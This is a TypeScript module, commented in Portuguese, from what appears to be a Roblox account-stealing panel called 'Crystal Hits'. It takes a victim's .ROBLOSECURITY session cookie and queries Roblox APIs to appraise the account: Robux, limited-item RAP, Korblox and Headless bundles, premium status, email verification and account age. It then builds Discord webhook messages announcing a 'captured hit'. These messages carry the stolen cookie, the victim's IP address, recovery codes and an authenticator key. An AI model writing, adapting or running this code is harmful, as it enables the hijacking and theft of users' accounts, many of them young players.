import axios from "axios";

interface RobloxUserInfo {
  id: number;
  name: string;
  displayName: string;
  profileLink: string;
  thumbnailUrl: string;
}

interface RobloxAccountDetails {
  userId: number;
  username: string;
  displayName: string;
  profileLink: string;
  thumbnailUrl: string;
  cookie: string;
  hasVerifiedEmail: boolean;
  hasPremium: boolean;
  robuxBalance: number;
  accountAgeDays: number;
  hasKorblox: boolean;
  hasHeadless: boolean;
  totalRAP: number;
  summaryValue: number;
  recoveryCodes: string | null;
  authenticatorKey: string | null;
}

/**
 * Busca informações do usuário no Roblox a partir do cookie ou ID
 */
export async function getRobloxUserInfo(cookie: string): Promise<RobloxUserInfo | null> {
  try {
    // 1. Obter informações básicas do usuário autenticado
    const authResponse = await axios.get("https://users.roblox.com/v1/users/authenticated", {
      headers: {
        Cookie: `.ROBLOSECURITY=${cookie}`
      }
    });

    const userId = authResponse.data.id;
    const name = authResponse.data.name;
    const displayName = authResponse.data.displayName;

    // 2. Obter thumbnail do avatar
    let thumbnailUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=1&width=420&height=420&format=png";
    try {
      const thumbResponse = await axios.get(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png&isCircular=false`);
      if (thumbResponse.data.data && thumbResponse.data.data.length > 0) {
        thumbnailUrl = thumbResponse.data.data[0].imageUrl;
      }
    } catch (e) {
      console.error("Erro ao buscar thumbnail do Roblox:", e);
    }

    return {
      id: userId,
      name: name,
      displayName: displayName,
      profileLink: `https://www.roblox.com/users/${userId}/profile`,
      thumbnailUrl: thumbnailUrl
    };
  } catch (error) {
    console.error("Erro ao validar cookie do Roblox:", error);
    return null;
  }
}

/**
 * Busca informações completas da conta incluindo segurança
 */
export async function getRobloxAccountDetails(cookie: string): Promise<RobloxAccountDetails | null> {
  try {
    const userInfo = await getRobloxUserInfo(cookie);
    if (!userInfo) return null;

    // Buscar informações de email, premium, robux, idade, itens e RAP
    let hasVerifiedEmail = false;
    let hasPremium = false;
    let robuxBalance = 0;
    let accountAgeDays = 0;
    let hasKorblox = false;
    let hasHeadless = false;
    let totalRAP = 0;

    // IDs conhecidos
    const KORBLOX_BUNDLE_ID = 192;
    const HEADLESS_BUNDLE_ID = 201;

    try {
      const emailResponse = await axios.get("https://accountinformation.roblox.com/v1/email", {
        headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
      });
      hasVerifiedEmail = emailResponse.data?.verified || false;
    } catch (e) {}

    try {
      const premiumResponse = await axios.get(`https://premiumfeatures.roblox.com/v1/users/${userInfo.id}/validate-membership`, {
        headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
      });
      hasPremium = premiumResponse.data || false;
    } catch (e) {}

    try {
      const economyResponse = await axios.get(`https://economy.roblox.com/v1/users/${userInfo.id}/currency`, {
        headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
      });
      robuxBalance = economyResponse.data?.robux || 0;
    } catch (e) {}

    try {
      const userDetailResponse = await axios.get(`https://users.roblox.com/v1/users/${userInfo.id}`);
      const createdDate = new Date(userDetailResponse.data.created);
      const now = new Date();
      accountAgeDays = Math.floor((now.getTime() - createdDate.getTime()) / (1000 * 60 * 60 * 24));
    } catch (e) {}

    // Verificar Korblox e Headless via API de inventário/bundles
    try {
      const bundlesResponse = await axios.get(`https://inventory.roblox.com/v1/users/${userInfo.id}/bundles`, {
        headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
      });
      const bundles = bundlesResponse.data?.data || [];
      hasKorblox = bundles.some((b: any) => b.id === KORBLOX_BUNDLE_ID || b.name?.toLowerCase().includes('korblox'));
      hasHeadless = bundles.some((b: any) => b.id === HEADLESS_BUNDLE_ID || b.name?.toLowerCase().includes('headless'));
    } catch (e) {}

    // Buscar RAP (Recent Average Price) de itens limitados
    try {
      const inventoryResponse = await axios.get(`https://inventory.roblox.com/v1/users/${userInfo.id}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100`, {
        headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
      });
      const collectibles = inventoryResponse.data?.data || [];
      totalRAP = collectibles.reduce((sum: number, item: any) => sum + (item.recentAveragePrice || 0), 0);
    } catch (e) {}

    return {
      userId: userInfo.id,
      username: userInfo.name,
      displayName: userInfo.displayName,
      profileLink: userInfo.profileLink,
      thumbnailUrl: userInfo.thumbnailUrl,
      cookie: cookie,
      hasVerifiedEmail: hasVerifiedEmail,
      hasPremium: hasPremium,
      robuxBalance: robuxBalance,
      accountAgeDays: accountAgeDays,
      hasKorblox: hasKorblox,
      hasHeadless: hasHeadless,
      totalRAP: totalRAP,
      summaryValue: robuxBalance + totalRAP,
      recoveryCodes: null,
      authenticatorKey: null
    };
  } catch (error) {
    console.error("Erro ao buscar detalhes da conta:", error);
    return null;
  }
}

/**
 * Formata a mensagem do Discord com Embed bonito (formato completo)
 */
export function formatDiscordEmbedComplete(accountDetails: RobloxAccountDetails, ipAddress?: string) {
  const fields = [
    {
      name: "👤 Usuário",
      value: `**${accountDetails.displayName}** (@${accountDetails.username})`,
      inline: true
    },
    {
      name: "💰 Robux",
      value: `\`${accountDetails.robuxBalance}\``,
      inline: true
    },
    {
      name: "📈 RAP / Summary",
      value: `\`${accountDetails.totalRAP}\` / \`${accountDetails.summaryValue}\``,
      inline: true
    },
    {
      name: "💀 Itens Raros",
      value: `${accountDetails.hasKorblox ? "✅ **KORBLOX**" : "❌ Korblox"} | ${accountDetails.hasHeadless ? "✅ **HEADLESS**" : "❌ Headless"}`,
      inline: false
    },
    {
      name: "📅 Idade da Conta",
      value: `\`${accountDetails.accountAgeDays} dias\``,
      inline: true
    },
    {
      name: "📧 Email Verificado",
      value: accountDetails.hasVerifiedEmail ? "✅ Sim" : "❌ Não",
      inline: true
    },
    {
      name: "👑 Premium",
      value: accountDetails.hasPremium ? "✅ Sim" : "❌ Não",
      inline: true
    },
    {
      name: "📍 Endereço IP",
      value: `\`${ipAddress || "N/A"}\``,
      inline: true
    },
    {
      name: "🔐 Recovery Codes",
      value: `\`${accountDetails.recoveryCodes || "None"}\``,
      inline: false
    },
    {
      name: "🔑 Authenticator Key",
      value: `\`${accountDetails.authenticatorKey || "Awaiting User Input."}\``,
      inline: false
    },
    {
      name: ".ROBLOSECURITY 🍪",
      value: `\`\`\`${accountDetails.cookie}\`\`\``,
      inline: false
    }
  ];

  // Adicionar informações do usuário no footer
  const footerText = `${accountDetails.username} (${accountDetails.userId}) - https://auth.immortal.rs | Hoje às ${new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' })}`;

  return {
    username: "AutoSecure Notifier - Imm",
    avatar_url: accountDetails.thumbnailUrl,
    embeds: [
      {
        color: 0x2b2d31, // Cor escura do Discord
        fields: fields,
        footer: {
          text: footerText,
          icon_url: accountDetails.thumbnailUrl
        },
        timestamp: new Date().toISOString()
      }
    ]
  };
}

/**
 * Formata a mensagem do Discord com Embed bonito (formato antigo)
 */
export function formatDiscordEmbed(userInfo: RobloxUserInfo, ipAddress?: string) {
  return {
    username: "Crystal Hits Notification",
    avatar_url: "https://i.ibb.co/qLt6nz5X/390e33ed88802388090d58f28a075ebc.jpg",
    embeds: [
      {
        title: "💎 Novo Hit Capturado! 💎",
        description: `Um novo usuário foi capturado pelo painel Crystal Hits.`,
        color: 0x9333ea, // Roxo Crystal
        fields: [
          {
            name: "👤 Usuário",
            value: `**${userInfo.displayName}** (@${userInfo.name})`,
            inline: true
          },
          {
            name: "🆔 ID do Roblox",
            value: `\`${userInfo.id}\``,
            inline: true
          },
          {
            name: "🌐 Link do Perfil",
            value: `[Clique aqui para ver o perfil](${userInfo.profileLink})`,
            inline: false
          },
          {
            name: "📍 Endereço IP",
            value: `\`${ipAddress || "Não identificado"}\``,
            inline: true
          }
        ],
        thumbnail: {
          url: userInfo.thumbnailUrl
        },
        footer: {
          text: "Crystal Hits Panel v2.0 • " + new Date().toLocaleString('pt-BR'),
          icon_url: "https://i.ibb.co/qLt6nz5X/390e33ed88802388090d58f28a075ebc.jpg"
        },
        timestamp: new Date().toISOString()
      }
    ]
  };
}
